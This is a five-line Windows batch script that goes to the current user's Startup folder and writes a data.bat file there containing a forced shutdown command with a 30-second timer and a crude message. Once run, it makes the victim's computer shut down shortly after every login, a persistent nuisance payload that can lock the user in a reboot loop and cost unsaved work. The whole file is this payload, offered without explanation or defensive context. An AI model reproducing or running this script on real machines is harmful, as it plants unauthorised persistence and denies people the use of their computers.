@echo off
cd\
C:
cd %homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo shutdown -s -t 30 -c "-(.)-(.)-">data.bat
